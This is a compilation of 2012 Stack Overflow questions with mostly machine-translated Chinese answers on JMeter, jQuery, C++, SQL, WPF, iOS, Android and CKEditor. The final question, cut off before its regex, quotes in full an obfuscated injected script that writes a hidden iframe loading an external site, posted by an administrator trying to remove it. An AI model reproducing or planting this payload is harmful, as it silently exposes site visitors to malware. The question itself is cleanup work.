![在此处输入图像描述](../Images/00efca09b5fd7fc8b2cac670f34313a9.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-26T11:24:55.993

这个想法与[PMD UBIK-INGENIERI 的回答](https://stackoverflow.com/a/13942729/841064)相同。

1.  在用户定义变量或测试计划变量中设置 USERS 变量（或者您可以通过命令行传递它）。
    同时设置变量：

    ```
    PERCENT1 to 0.5
    PERCENT2 to 0.4
    PERCENT3 to 0.1 
    ```

2.  添加 3 个步进线程组：

“此组将开始”设置为

```
${__BeanShell(Math.round(${PERCENT1}*${USERS})}
${__BeanShell(Math.round(${PERCENT2}*${USERS})}
${__BeanShell(Math.round(${PERCENT3}*${USERS})} 
```

“然后开始”设置为：

```
${__BeanShell(Math.round(${PERCENT1}*${USERS}/10)}
${__BeanShell(Math.round(${PERCENT2}*${USERS}/10)}
${__BeanShell(Math.round(${PERCENT3}*${USERS}/10)} 
```

如果 USERS 变量的值可以除以 100，它将起作用**

# jquery - How to make rhonoslider responsive

> ID：14039608
> 
> 赞同：2
> 
> 时间：2012-12-26T10:56:27.357
> 
> 标签：jquery, css, responsive-design, jquery-slider

In my wordpress theme I have Rhinoslider jquery slider. Rhinoslider is working fine, but this slider is not responsive.Is anyone here have an idea that how to modify css or js to have my slider responsive. This slider is release under MIT and GPL2 License. API link of Rhinoslider: [http://rhinoslider.com/api/create-your-own-effects/](http://rhinoslider.com/api/create-your-own-effects/)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-26T11:01:47.130

哈。前一天我也遇到了同样的问题。我在每个断点上重新加载网站。;P

我的代码：

```
function responsivecheck(size){
    var compare = $("#wrap").width();
    if(size != compare){
        reload();
    } else {
        setTimeout(
            function(){responsivecheck(compare)}, 
            5000
        );
    }
} // ! executed after rhinoslider initialization !

function reload() {
    window.location.href = window.location.href;
} 
```

用[在这里](http://www.tymek.cz/dok/liceum/)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-12-20T09:00:06.923

```
$(document).ready(function(){ 

  $(window).resize(function(){ 

var getslidewd= $('.wrapper').width(); 

var getslidehi= $('.slide').height( ); 

$('.rhino-container').width(getslidewd); 

$('.rhino-container').height(getslidehi); 

$('.rhino-container #slider li').width(getslidewd); 

$('.rhino-container #slider li').height(getslidehi); 

});

})

```

html 格式

```
<div class="wrapper"> 
<ul id="slider"> 
<li><div class="slide"></div></li> 
</ul> 
</div>
```

为包装器提供固定宽度，为滑动和#slider 固定高度。使用媒体查询...用于移动设备和 ipad

如果您想使用全屏滑块，请按照以下步骤操作：

$(document).ready(function(){
$(window).resize(function(){
var getslidewd= $(window).width();
var getslidehi= $(window).height();
$('. rhino-container').width(getslidewd);
$('.rhino-container').height(getslidehi);
$('.rhino-container #slider li').width(getslidewd);
$('.rhino-容器#slider li').height(getslidehi);
});
})

# java - Layout in Blackberry

> ID：14039612
> 
> 赞同：3
> 
> 时间：2012-12-26T10:57:00.750
> 
> 标签：java, layout, blackberry, user-interface

I'm new to blackberry development. Is there something like palette as android in blackberry for creating layout? Or any other best approch to create layout in blackberry?

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-26T11:03:54.977

在黑莓中有管理人员来做这个布局工作

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-27T06:14:59.707

> @user1928849 - 你能告诉我如何将 lwiit 创建的文件与我们的黑莓项目连接或附加吗？

检查此链接以获取 netbeans 希望它有帮助

[从 CodeNameOne 博客的资源编辑器生成 Netbeans 项目](http://miketeo.net/wp/index.php/2009/02/22/lwuit-demo-on-blackberry-with-eclipse.html)

而对于日食 -

[带有 Eclipse 的 BlackBerry 上的 LWUIT 演示](http://miketeo.net/wp/index.php/2009/02/22/lwuit-demo-on-blackberry-with-eclipse.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-26T11:36:45.417

在黑莓中，有`Layout Managers`用于创建`UserInterface`.

实际上只有 4 个内置布局管理器。这是黑莓中的四种主要布局

*   VerticalFieldManager – 这个布局管理器只是从顶部/底部排列您添加到它的字段。

*   Horizo​​ntalFieldManager – 这个布局管理器只是将您添加到其中的字段从左到右排列在一行上。

*   FlowFieldManager - 这个布局管理器只是简单地添加你从左到右添加的字段，并在开始新行之前尽可能多地添加到一行，并根据需要不断添加行。

*   DialogFieldManager – 此布局管理器允许您在固定模板中布局字段，该模板的顶行有一个图标和消息，然后是一组您可以在其下方添加的字段。

您可以使用本教程来了解`Blackberry` [使用 BlackBerry 布局管理器中的布局工作 -](http://developerlife.com/tutorials/?p=808)进一步阅读教程也请参阅本教程。[黑莓中的用户界面](http://www.c-sharpcorner.com/uploadfile/manish1231/working-with-layout-managers-user-interface-in-blackberry/)。请查看[Manager 文档](http://www.blackberry.com/developers/docs/5.0.0api/net/rim/device/api/ui/Manager.html)。

# ffmpeg - ffmpeg command to is throwing error

> ID：14039619
> 
> 赞同：0
> 
> 时间：2012-12-26T10:57:28.867
> 
> 标签：ffmpeg

I am new to ffmpeg usage. I am trying to merge two video file. The below bullets will provide you more details about it.

1\. I-ball usb camera
2\. Screen capture utility named UScreenCapture.

The below command i am using on DOS.

```
ffmpeg -f dshow  -i video="iBall Face2Face Webcam C12.0" -f dshow -i video="UScreenCapture"  -r 25 -vcodec mpeg4 -q 12 -f mpegts test.ts 
```

This command captures only from `Uscreencapture` source.

while grabbing frames from Camera it is giving me an error saying that real-time buffer 90% full! frame dropped! real-time buffer 121% full! frame dropped!

Can any one provide me the solution for this issue?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-25T20:49:33.167

看起来你需要 ffmpeg -map 功能

“指定一个或多个输入流作为输出文件的源”

[FFMPEG“-map”文档](http://ffmpeg.org/ffmpeg.html#Advanced-options)

# c++ - C++11 Lambda woes

> ID：14039623
> 
> 赞同：0
> 
> 时间：2012-12-26T10:57:37.573
> 
> 标签：c++, c++11, lambda

Any ideas why the following code segfaults?

`class foo` represents any class. This seams like a good idea for providing an evented interface.

```
#include <iostream>
#include <functional>

class foo
{
public:
  foo()
  {
    val = 42;  
  };

  void bar(std::function<int(foo*)> f)
  {
    this->_bar = std::bind(f, this);
  }
  std::function<int()> _bar;
  int val;
};

int main(void)
{
  foo *foobar;
  foobar->bar([](foo *self)->int{return self->val;});

  std::cout << foobar->_bar();
} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-26T10:59:41.420

It segfauls because `foobar` is not pointing to anything, you should use `foo foobar;`.

EDIT:

A short review.

```
class foo
{
public:
  foo()
  {
    val = 42;  // Use initialization list.
  };

  void bar(std::function<int(foo*)> f) // Use reference (foo&) instead of pointer (foo*).
  {
    this->_bar = std::bind(f, this); // Move "f" into bind and use "std::ref()" so you can pass "*this" by reference without copying.
  }

  // Hide local member variables

  std::function<int()> _bar; // Never use _ as a prefix, only the compiler is allowed to use _ prefix.
  int val;
};

int main(void)
{
  foo *foobar; // Use value semantics, i.e. "foo foobar".

  foobar->bar([](foo *self)->int{return self->val;});

  std::cout << foobar->_bar();
} 
```

e.g.

```
class foo
{
public:
    foo()
        : val_(42)
    {
    };

    void set_bar(std::function<int(foo&)> f)
    {
        bar_ = std::bind(std::move(f), std::ref(*this));
    }

    int invoke_bar() const
    {   
        return bar_;
    }

    int get_val() const
    {
        return val_;
    }

private:

    std::function<int()> bar_;
    int val_;
};

int main(void)
{
  foo foobar;
  foobar.set_bar([](foo& self) -> int
  {
     return self.get_val();
  });

  std::cout << foobar.invoke_bar();
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-26T11:00:16.627

You never create a foo, you just declare a pointer to it. Change `foo* foobar` to `foo foobar` and then get the address to it with `&`. (Not that you need it in this example).

This should work I guess.

```
foo foobar;
foobar.bar([](foo* self){return self->val;});
std::cout << foobar._bar() << std::endl;
return 0; 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-12-26T10:59:23.153

Because you declared a foobar pointer but didn't use `new` to allocate memory for it. `foo *foobar = new foo();` should make your code work. But you also use automatic storage duration and pass parameter to lambada by reference:

```
int main(void)
{
  foo foobar;
  foobar.bar([](foo *self)->int{return self->val;});

  std::cout << foobar._bar();
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-12-26T11:41:37.993

由于似乎没有人明确表示：您的问题与 lambda 无关；对于普通的功能对象或立即的函数调用，您将遇到完全相同的问题。在担心 lambda 和其他“高级”功能之前，您必须学习该语言的基础知识。在这种情况下：

1.  您永远不能使用未初始化的变量。使用指针这样做的结果通常比使用 uninitialized 时更引人注目`int`，但在所有情况下它都是未定义的行为。如果变量具有类类型，则为其定义构造函数，初始化所有成员（和基类）。如果变量没有类类型（并且指针没有*类*类型），请不要在没有初始化子句的情况下定义它。

2.  C++ 默认使用值语义。除非有充分的理由，否则不应*使用*指针。使用一个值。

在您可以编写尊重这些原则的代码而不使用`bind`and之前`lambda`，您不应该查看`bind`and `lambda`。在你知道如何走路之前，你不能跑步。

# sql - Query to find averge number of students in every batch of each campus

> ID：14039627
> 
> 赞同：1
> 
> 时间：2012-12-26T10:57:56.630
> 
> 标签：sql

![enter image description here](../Images/ddee7df02d17b3e9d2f3089800d4fa09.png)I have a query which i am not able to figure out since i am new with sql and i have a project due tomorow to submit

any help will be appreciated

i have a registration table which has the following structure

```
Student_ID int,
Course varchar(15),
Score int,
Semester varchar(15),
Discipline varchar(10),
Campus varchar(15),
Degree varchar(10),
Year int 
```

the Registration table has no Primary key it is basically for developing a date warehouse

so no primary key, and the data in this table is from 4 different campuses of the same university so Student_id is repeated a number of times

The Query is that i need to find average number of students in every batch(YEAR) of each campus

kindly help me if any one can

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-26T11:20:38.303

```
DECLARE @Num_Discipline AS INT

SELECT DISTINCT @Num_Discipline = Count(Discipline)
FROM registration

SELECT Count(student_id) AS nStudents, Count(student_id)/@Num_Discipline AS Avg_Students
FROM registration
GROUP BY Campus, Year 
```

`Avg_Students`这是特定年份每个校区的平均学生人数，假设校区有相同数量的学科。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-26T11:04:56.853

我希望这是你所需要的::

给了我一些数据快照以便更好地理解。

```
select count(1),count(distinct student_id),year,count(distinct student_id)/count(1)   from   registration 
group by year; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-26T11:10:14.977

```
select year, campus, count(distinct student_id)  from registration
       group by year, campus 
```

# wpf - In a WPF app, bullets are not getting displayed in the password box

> ID：14039631
> 
> 赞同：2
> 
> 时间：2012-12-26T10:58:58.880
> 
> 标签：wpf, passwordbox

In our WPF app we have a **PasswordBox**, which by default, displays bullets for characters typed in it. For a particular user(XP SP3), this was working fine until a month back when he could not enter anything in the password box. In order to find if any changes we had recently made to the product had caused it or was it something entirely different, I created a small app having just a text box and password box and a button. On click of the button, contents of the text box and password box are displayed in a message box.

XAML:

```
<Grid>
    <Grid.RowDefinitions>
        <RowDefinition Height="*"></RowDefinition>
        <RowDefinition Height="*"></RowDefinition>
        <RowDefinition Height="*"></RowDefinition>
    </Grid.RowDefinitions>
    <Grid.ColumnDefinitions>
        <ColumnDefinition Width="*"></ColumnDefinition>
        <ColumnDefinition Width="*"></ColumnDefinition>
    </Grid.ColumnDefinitions>
    <TextBlock Grid.Row="0" Grid.Column="0" HorizontalAlignment="Right" VerticalAlignment="Center">User Name:</TextBlock>
    <TextBox x:Name="usr" Width="120" Height="30" Grid.Row="0"
    Grid.Column="1"></TextBox>
    <TextBlock Grid.Row="1" Grid.Column="0" HorizontalAlignment="Right"
    VerticalAlignment="Center">Password:</TextBlock>
    <PasswordBox x:Name="pass" Width="120" Height="30"
    Grid.Row="1" Grid.Column="1"></PasswordBox>
    <Button Height="30" Width="60" Grid.Row="2" Grid.ColumnSpan="2"
    Click="Button_Click">Ok</Button>
</Grid> 
```

Code behind:

```
private void Button_Click(object sender, RoutedEventArgs e)
{
    MessageBox.Show("Username: " + usr.Text + ", Password: " + pass.Password);
} 
```

On running the app, we discovered that the user was actually able to type in the password, and it was getting displayed correctly on clicking OK. He was simply not seeing the bullets. I tried changing the font size and foreground but to no effect. I have the same configuration on my machine and it works fine for me. At last I changed the password char to '*' and that is getting displayed fine on the user's machine. Any help on why the bullets are not getting displayed?

# ios - 如何将 2 个 UIImageView 中的 2 个图像合并为 1 个图像

> ID：14039632
> 
> 赞同：2
> 
> 时间：2012-12-26T10:59:01.883
> 
> 标签：ios, graphics, cgaffinetransform

我想将 2 UIImageView 中的 2 个图像合并为 1 个具有“正确”位置、角度、比例比例的图像，正如我在屏幕上看到的那样。

在我的项目中，有 2 个 UIImageView - imageView 是主 UIImageView - topImageView 是可以拖动、旋转、缩放的覆盖 UIImageView

我可以保存通过绘制 2 张图像合并的图像，但位置、角度、比例比例错误。

这是我的代码：

```
UIImage *img = topImageView.image;
UIImage *bottomImg = self.imageView.image;
CGSize bounds = self.imageView.image.size;

UIGraphicsBeginImageContext(bounds);
CGContextRef ctx = UIGraphicsGetCurrentContext();
CGContextTranslateCTM(ctx, topImageView.image.size.width * 0.5, topImageView.image.size.height * 0.5);
CGFloat angle = atan2(topImageView.transform.b, topImageView.transform.a);
CGContextRotateCTM(ctx, angle);

[topImageView.image drawInRect:CGRectMake(-topImageView.image.size.width * 0.5,
                                          -topImageView.image.size.height * 0.5,
                                          topImageView.image.size.width,
                                          topImageView.image.size.height)];
UIImage *newImage = UIGraphicsGetImageFromCurrentImageContext();
UIGraphicsEndImageContext();

UIGraphicsBeginImageContext(bounds);
[bottomImg drawInRect:CGRectMake(0, 0, bounds.width, bounds.height)];
[newImage drawInRect:CGRectMake(topImageView.frame.origin.x,
                                topImageView.frame.origin.y,
                                newImage.size.width,
                                newImage.size.height)];
UIImage *finalImage = UIGraphicsGetImageFromCurrentImageContext();
UIGraphicsEndImageContext(); 
```

有什么想法可以帮助我吗？非常感谢！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-26T14:16:56.523

将这两个图像作为子视图添加到 UIView。对图像执行您需要的操作，然后像这样拍摄 UIVIew 的快照：

```
UIGraphicsBeginImageContext(view.bounds.size);
[view.layer renderInContext:UIGraphicsGetCurrentContext()];
UIImage *MergedImage = UIGraphicsGetImageFromCurrentImageContext();
UIGraphicsEndImageContext(); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-26T14:21:43.130

试试这个

```
#pragma mark - Marge two Images 

- (UIImage *) addImageToImage:(UIImage *)img withImage2:(UIImage *)img2{

    CGSize size = CGSizeMake(imageView.image.size.width, imageView.image.size.height);
    UIGraphicsBeginImageContext(size);

    CGPoint pointImg1 = CGPointMake(0,0);
    [img drawAtPoint:pointImg1]; 

    CGPoint pointImg2 = CGPointMake(0,0);
    [img2 drawAtPoint: pointImg2];

    UIImage* result = UIGraphicsGetImageFromCurrentImageContext();
    UIGraphicsEndImageContext();

    return result;
}

[self addImageToImage:imageView.image withImage2:imageView2.image]; 
```

# android - 如何使用其他数据滑动到相同的片段：？

> ID：14039634
> 
> 赞同：2
> 
> 时间：2012-12-26T10:59:18.800
> 
> 标签：android, list, android-fragments, swipe

我正在构建这个应用程序，我有 2 个活动。它们都包含 3 个片段 - 一个用于标题，一个用于内容，一个用于选项卡控件。如下图所示。

![应用程序设计](../Images/33cb611cf94735c0680b8ce62b55e1d8.png)

第一个活动用于显示一些数据标题的列表（项目名称等）、搜索、应用程序信息等。当用户按下列表中的项目时，应用程序会将他带到另一个活动以向他显示所选项目的详细信息。这个“详细信息”活动有 6 个不同的内容片段，用户通过选项卡控制片段中的按钮在它们之间切换（我确实通过显示选择的一个并隐藏所有其他内容片段来切换内容片段 - 我不知道这是否正确，这是我的第一个应用程序所以一开始我就想到了:)）。

我想做的是：当我详细说明并向左/向右滑动时，我希望应用程序将我带到上一个/下一个项目的详细信息，到我当前所在的同一片段（所以不要到下一个内容片段，但要详细说明第一个活动列表中的下一项）。

请问这有可能吗？因为我完全不知道该怎么做:)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-26T16:02:24.773

> 我想做的是：当我详细说明并向左/向右滑动时，我希望应用程序将我带到上一个/下一个项目的详细信息，到我当前所在的同一片段（所以不是下一个内容片段，但要详细说明第一个活动列表中的下一项）。

如果你想左右滑动，那么你需要一个`ViewPager`小部件。我不确定您的详细信息活动应该如何表现，因此我为您提供了两个选项。**您是否希望仅当某个片段是用户当前查看的片段时才**能够切换到下一个/上一个项目的详细信息（来自 6 个内容片段，我假设它们是相关的并显示单个项目的各种数据）？如果是，那么在所需的片段中，您可以将片段的当前内容（仅充当容器）替换为`ViewPager`并将嵌套片段用于实际内容。如果用户切换到上一个/下一个项目的详细信息，然后突然想从其余 5 个内容片段之一中查看该项目的数据，那么您需要对它们进行一些更新方法来刷新数据以显示当前项目（a`OnPageChangeListener`在这里很有用）。

第二个选项是，如果您想允许用户从 6 个内容片段中的任何一个向左/向右滑动。如果是这种情况，您将使用与上述相同的方法，但您将修改这 6 个片段中的每一个。

显示下一个/上一个项目很容易，只需获取某种数据标识符（位置，id），检索整个使用的数据（如在第一个活动中），然后在它们之间循环。

# javascript - 在ckeditor textarea中应用背景颜色

> ID：14039638
> 
> 赞同：1
> 
> 时间：2012-12-26T10:59:27.290
> 
> 标签：javascript, css, ckeditor

我在 ckeditor 实例的文本区域中应用背景颜色时遇到了一些问题。

当用户在不添加任何文本的情况下单击提交时，会显示一条消息，告诉他填写所有必填字段，并且这些必填字段区域都带有设置为的文本字段`background-color: #CFC183;`。

由于 ckeditor 是使用 javascript 代码创建的，因此我使用它来尝试检查文本区域中是否输入了任何文本。如果没有字符，我会应用更改。当我在控制台中应用此代码时：

```
CKEDITOR.instances.body.document.getBody().setStyle('background-color', '#CFC183'); 
```

它完全像我想要的那样应用背景。所以，我在我的 javascript 文件中添加了这个 javascript 代码来尝试管理它，但似乎没有工作。这是我的代码：

```
var editorInstance = CKEDITOR.replace('body', { toolbar : 'Full' });
editorInstance.on("instanceReady", function (ev) { 
    var editorCKE = CKEDITOR.instances.body; readyMap[editorCKE] = true;
    editorCKE.setReadOnly(true); 
});
var hasText = CKEDITOR.instances.body.document.getBody().getChild(0).getText();
if (!hasText) { 
    CKEDITOR.on('instanceCreated', function(e) { 
        e.editor.document.getBody().setStyle('background-color', '#CFC183');
    });
} 
```

Firebug 显示此错误消息：

> 类型错误：CKEDITOR.instances.body.document 未定义

我不太擅长 Javascript，所以我的代码有什么问题吗？我已经在这里检查了这个[问题](https://stackoverflow.com/questions/11397523/changing-the-background-color-for-ckeditor)，所以我认为我的 javascript 代码有问题，我需要你的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-27T09:36:27.647

我猜你在这一行有一个错误：

```
var hasText = CKEDITOR.instances.body.document.getBody().getChild(0).getText(); 
```

这是因为您试图在准备好之前（`instanceReady`事件之前）获取文档元素。

这里会抛出同样的错误：

```
if (!hasText) { 
    CKEDITOR.on('instanceCreated', function(e) { 
        e.editor.document.getBody().setStyle('background-color', '#CFC183');
    });
} 
```

再次 -`instanceCreated`还为时过早。您必须将所有代码移至`instanceReady`侦听器。你会有类似的东西（我不确定我是否理解你想要实现的目标）：

```
var editor = CKEDITOR.replace( 'body', { toolbar: 'Full' } );
editor.on( 'instanceReady', function( evt ) {
    readyMap[ editor.name ] = true;
    editor.setReadOnly( true ); 

    var hasText = editor.document.getBody().getFirst().getText();
    if ( !hasText ) { 
        editor.document.getBody().setStyle( 'background-color', '#CFC183' );
    }
} ); 
```

如您所见，您的代码中还有一个问题：

```
readyMap[editorCKE] = true; 
```

在 JS 中没有弱映射（还没有，但很快就会引入）。只有字符串可以用作对象的键。在你的情况下，`toString()`方法将被调用`editorCKE`，它返回`[object Object]`。这就是我在`name`那里添加属性的原因。

# ruby-on-rails - 如何为 <%= f.datagrid_filter filter%> 放置占位符？

> ID：14039640
> 
> 赞同：0
> 
> 时间：2012-12-26T10:59:39.653
> 
> 标签：ruby-on-rails, datagrid

我制作了一个 Rails 应用程序，并使用`datagrid`gem 来处理过滤器、分页和订单（升序和降序）。`<%= f.datagrid_filter filter%>`我应该根据表格的字段（例如：表格`title`中的字段）编写过滤器`topics`。

现在`<%= f.datagrid_filter filter%>`返回一个传统的 html 输入标签，如下所示。
`<input id="topic_report_title" class="title string_filter" type="text" size="30" name="topic_report[title]">`在 html 控制台中。

现在我只想将占位符放在那个辅助方法中。
有人可以帮忙吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-26T14:07:02.797

您是否尝试过执行以下操作：`<%= f.datagrid_filter filter, :placeholder => "placeholder text"%>`

# jquery - 每次通过 jquery 进行 4 次迭代后添加一个类

> ID：14039642
> 
> 赞同：1
> 
> 时间：2012-12-26T10:59:41.983
> 
> 标签：jquery, html

我需要做的是在 1st 5th 9th 13th div 上添加一个类，依此类推，但我编写的脚本是硬编码的，这对我来说很好，但问题是它只将类添加到第 5 个，但我需要 1、5， 9等

```
 <div class="impresna-wrapp">
                        <div class="impresna ">
            <p><img src="http://localhost/AON/wp-content/uploads/2012/12/impresna-img-     1.jpg" alt="impresna-img-1" width="203" height="101" class="alignnone size-full wp-image-46"></p>
            <p><span class="emboss">EXTRA</span> | Ronaldo arremata capacete de Rubens Barrichello em leil�o de caridade em torneio de golf...</p>
            <a href="#">+MAIS</a>
            <br clear="all">
        </div>
                    <div class="impresna ">
            <p><img class="alignnone size-full wp-image-46" alt="impresna-img-1" src="http://localhost/AON/wp-content/uploads/2012/12/impresna-img-1.jpg" width="203" height="101"></p>
            <p><span class="emboss">EXTRA</span> | Ronaldo arremata capacete de Rubens Barrichello em leil�o de caridade em torneio de golf...</p>
            <a href="#">+MAIS</a>
            <br clear="all">
        </div>
                    <div class="impresna ">
            <p><img class="alignnone size-full wp-image-46" alt="impresna-img-1" src="http://localhost/AON/wp-content/uploads/2012/12/impresna-img-1.jpg" width="203" height="101"></p>
            <p><span class="emboss">EXTRA</span> | Ronaldo arremata capacete de Rubens Barrichello em leil�o de caridade em torneio de golf...</p>
            <a href="#">+MAIS</a>
            <br clear="all">
        </div>
                    <div class="impresna ">
            <p><img class="alignnone size-full wp-image-46" alt="impresna-img-1" src="http://localhost/AON/wp-content/uploads/2012/12/impresna-img-1.jpg" width="203" height="101"></p>
            <p><span class="emboss">EXTRA</span> | Ronaldo arremata capacete de Rubens Barrichello em leil�o de caridade em torneio de golf...</p>
            <a href="#">+MAIS</a>
            <br clear="all">
        </div>
                    <div class="impresna ">
            <p><img class="alignnone size-full wp-image-46" alt="impresna-img-1" src="http://localhost/AON/wp-content/uploads/2012/12/impresna-img-1.jpg" width="203" height="101"></p>
            <p><span class="emboss">EXTRA</span> | Ronaldo arremata capacete de Rubens Barrichello em leil�o de caridade em torneio de golf...</p>
            <a href="#">+MAIS</a>
            <br clear="all">
        </div>
                    <div class="impresna ">
            <p><img class="alignnone size-full wp-image-46" alt="impresna-img-1" src="http://localhost/AON/wp-content/uploads/2012/12/impresna-img-1.jpg" width="203" height="101"></p>
            <p><span class="emboss">EXTRA</span> | Ronaldo arremata capacete de Rubens Barrichello em leil�o de caridade em torneio de golf...</p>
            <a href="#">+MAIS</a>
            <br clear="all">
        </div>
                    <div class="impresna ">
            <p><img class="alignnone size-full wp-image-46" alt="impresna-img-1" src="http://localhost/AON/wp-content/uploads/2012/12/impresna-img-1.jpg" width="203" height="101"></p>
            <p><span class="emboss">EXTRA</span> | Ronaldo arremata capacete de Rubens Barrichello em leil�o de caridade em torneio de golf...</p>
            <a href="#">+MAIS</a>
            <br clear="all">
        </div>

                            <div class="impresna  zoom-img" id="zoom-img">
            <p><img src="http://localhost/AON/wp-content/uploads/2012/12/impresna-zoom-img.jpg" alt="impresna-zoom-img" width="122" height="170" class="alignnone size-full wp-image-66"></p>
            <span class="main"><span class="emboss">MARCA - SP</span> 20.09.12
            <a href="#">+ZOOM</a></span>
            <br clear="all">
        </div>
                    <div class="impresna  zoom-img" id="zoom-img">
            <p><img src="http://localhost/AON/wp-content/uploads/2012/12/impresna-zoom-img.jpg" alt="impresna-zoom-img" width="122" height="170" class="alignnone size-full wp-image-66"></p>
            <span class="main"><span class="emboss">MARCA - SP</span> 20.09.12
            <a href="#">+ZOOM</a></span>
            <br clear="all">
        </div>

    </div> 
```

这是脚本：

```
 $('div.impresna-wrapp').find('div.impresna:nth-child(5)').each(function() {
           $(this).addClass("alter-impresna");
            }); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-26T11:01:21.207

你需要使用`nth-child(4n+1)`

**[现场演示](http://jsfiddle.net/rajaadil/aY8AV/)**

```
$('div.impresna-wrapp').find('div.impresna:nth-child(4n+1)').each(function() {
           $(this).addClass("alter-impresna");
}); 
```

# windows - 关于堆栈内存的说明 - 它在哪里？

> ID：14039643
> 
> 赞同：1
> 
> 时间：2012-12-26T10:59:43.823
> 
> 标签：windows, stack

据我所知，堆栈不是PE 部分映射内存（即它没有映射到PE win32 部分）。

我的问题是：堆栈内存驻留在哪里？操作系统把它放在哪里？

操作系统是否在进程启动时为堆栈分配一页内存，并在跳转到进程代码之前将 ESP 寄存器值更改为该页？我有点困惑。。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-26T11:05:51.997

操作系统将它放在任何可以在虚拟地址空间中找到空闲空间的地方。它不是 PE 文件的一部分。

每个进程都有一个虚拟地址空间。模块被加载到该地址空间中。堆是在该地址空间中创建的。堆栈也是如此。

对于非托管进程，操作系统为新线程保留整个堆栈分配，然后按需提交内存。托管 .net 进程有不同的策略。他们在创建每个线程时提交并保留整个堆栈分配。

# regex - sed multiline replace HTML with javascript malicious code

> ID：14039644
> 
> 赞同：-1
> 
> 时间：2012-12-26T10:59:43.803
> 
> 标签：regex, sed, replace, multiline

I've a apache server that has been infected with pieces of malicious javascript code to infect the computers that visit the web page. What i'm trying to do is remove these pieces of malicious code using find and sed commands in a Linux server. I have created a regular expression for sed that match almost everything but the "" end tag. It is in a new line and I can't find the way to match it as well.

The malicious code is:

```
<script>if (i5463 == null) { var i5463 = 1; var vst = String.fromCharCode(68)+String.fromCharCode(111)+String.fromCharCode(110)+String.fromCharCode(101); window.status=vst;  document.write(String.fromCharCode(60)+String.fromCharCode(68)+String.fromCharCode(73)+String.fromCharCode(86)+String.fromCharCode(32)+String.fromCharCode(105)+String.fromCharCode(100)+String.fromCharCode(61)+String.fromCharCode(99)+String.fromCharCode(104)+String.fromCharCode(101)+String.fromCharCode(99)+String.fromCharCode(107)+String.fromCharCode(51)+String.fromCharCode(54)+String.fromCharCode(48)+String.fromCharCode(32)+String.fromCharCode(115)+String.fromCharCode(116)+String.fromCharCode(121)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(61)+String.fromCharCode(34)+String.fromCharCode(68)+String.fromCharCode(73)+String.fromCharCode(83)+String.fromCharCode(80)+String.fromCharCode(76)+String.fromCharCode(65)+String.fromCharCode(89)+String.fromCharCode(58)+String.fromCharCode(32)+String.fromCharCode(110)+String.fromCharCode(111)+String.fromCharCode(110)+String.fromCharCode(101)+String.fromCharCode(34)+String.fromCharCode(62)+String.fromCharCode(60)+String.fromCharCode(105)+String.fromCharCode(102)+String.fromCharCode(114)+String.fromCharCode(97)+String.fromCharCode(109)+String.fromCharCode(101)+String.fromCharCode(32)+String.fromCharCode(115)+String.fromCharCode(114)+String.fromCharCode(99)+String.fromCharCode(61)+String.fromCharCode(34)+String.fromCharCode(104)+String.fromCharCode(116)+String.fromCharCode(116)+String.fromCharCode(112)+String.fromCharCode(58)+String.fromCharCode(47)+String.fromCharCode(47)+String.fromCharCode(51)+String.fromCharCode(54)+String.fromCharCode(48)+String.fromCharCode(46)+String.fromCharCode(119)+String.fromCharCode(101)+String.fromCharCode(98)+String.fromCharCode(115)+String.fromCharCode(116)+String.fromCharCode(97)+String.fromCharCode(116)+String.fromCharCode(97)+String.fromCharCode(110)+String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(121)+String.fromCharCode(122)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(46)+String.fromCharCode(114)+String.fromCharCode(117)+String.fromCharCode(47)+String.fromCharCode(105)+String.fromCharCode(110)+String.fromCharCode(100)+String.fromCharCode(101)+String.fromCharCode(120)+String.fromCharCode(46)+String.fromCharCode(104)+String.fromCharCode(116)+String.fromCharCode(109)+String.fromCharCode(108)+String.fromCharCode(63)+String.fromCharCode(112)+String.fromCharCode(61)+String.fromCharCode(50)+String.fromCharCode(51)+String.fromCharCode(54)+String.fromCharCode(55)+String.fromCharCode(54)+String.fromCharCode(56)+String.fromCharCode(34)+String.fromCharCode(32)+String.fromCharCode(119)+String.fromCharCode(105)+String.fromCharCode(100)+String.fromCharCode(116)+String.fromCharCode(104)+String.fromCharCode(61)+String.fromCharCode(34)+screen.width+String.fromCharCode(34)+String.fromCharCode(32)+String.fromCharCode(104)+String.fromCharCode(101)+String.fromCharCode(105)+String.fromCharCode(103)+String.fromCharCode(104)+String.fromCharCode(116)+String.fromCharCode(61)+String.fromCharCode(34)+screen.height+String.fromCharCode(34)+String.fromCharCode(62)+String.fromCharCode(60)+String.fromCharCode(47)+String.fromCharCode(105)+String.fromCharCode(102)+String.fromCharCode(114)+String.fromCharCode(97)+String.fromCharCode(109)+String.fromCharCode(101)+String.fromCharCode(62)+String.fromCharCode(60)+String.fromCharCode(47)+String.fromCharCode(68)+String.fromCharCode(73)+String.fromCharCode(86)+String.fromCharCode(62)); window.status=vst; }
</script> 
```

Note of the writer: After creating the question, I can see that the web formatting cuts the previous sample. If you want to see the full sample of malicious javascript code, have a look at the text not bold in the next text and just add at the end of the text a "new line" and a "" html tag.

```
The regular expression that works for all the text but for the last "</script>" is:
